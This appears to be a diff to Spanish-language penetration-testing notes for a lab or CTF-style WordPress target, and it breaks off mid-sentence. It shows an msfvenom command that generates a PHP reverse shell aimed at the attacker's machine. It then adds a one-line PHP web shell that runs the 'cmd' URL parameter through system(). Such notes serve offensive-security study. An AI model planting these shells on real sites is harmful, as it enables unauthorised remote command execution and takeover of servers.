@@ -74,3 +74,12 @@ msfvenom -p php/reverse_php LHOST=(IP_MAQUINA_ATACANTE) LPORT=(PUERTO) -f raw > 
 ![](../Imagenes/Pasted%20image%2020250107211623.png)
 
 - le damos a update file, tenemos a nuestra maquina a escucha y volvemos a la pagina IP/blog, ya tenemos conexión.
+
+- Si solo tenemos el puerto 80 abierto, y queremos acceder a la maquina victima, si entramos al wordress, logeamos y configuramos un directorio, debemos poner el siguiente comando:
+
+```
+<?php
+		system($_GET['cmd']);
+?>
+```
+- Así cuando ejecute
